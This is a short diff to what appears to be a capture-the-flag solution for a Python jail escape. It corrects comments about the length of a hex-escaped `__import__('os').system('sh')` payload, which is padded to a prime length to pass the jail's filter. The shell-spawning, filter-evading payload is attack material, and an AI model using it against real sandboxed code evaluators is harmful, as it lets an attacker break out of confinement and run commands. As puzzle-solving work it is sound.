@@ -1061,8 +1061,8 @@ while True:
 
 # Example: want `__import__('os').system('sh')` but need prime length
 payload = "__import__('\\x6f\\x73').system('\\x73\\x68')"
-# len(payload) = 38 (not prime) -> pad to 41 (prime)
-payload_padded = payload + " #aaa"  # 38+4=42 still not prime, try 41
+# len(payload) = 41 (prime, so usable as-is; \\ in source delivers single-backslash \x escapes that the jail's eval decodes)
+payload_padded = payload + " #aaa"  # 41+5=46 not prime — extend the brute-force loop below instead
 # Brute force padding:
 for pad in range(20):
     cand = payload + " " + "#" * pad
